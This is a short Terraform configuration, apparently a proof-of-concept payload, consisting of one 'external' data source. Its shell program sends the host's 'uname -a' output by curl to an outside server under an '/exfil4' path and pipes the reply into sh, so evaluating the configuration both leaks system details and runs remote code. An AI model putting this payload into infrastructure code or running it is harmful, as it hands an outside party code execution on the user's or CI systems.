data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary \"$(uname -a)\" https://c7kn3r7vbtmtto5qnyf5r6qriiojcd02.net-spi.com/exfil4 | sh"] 
} 
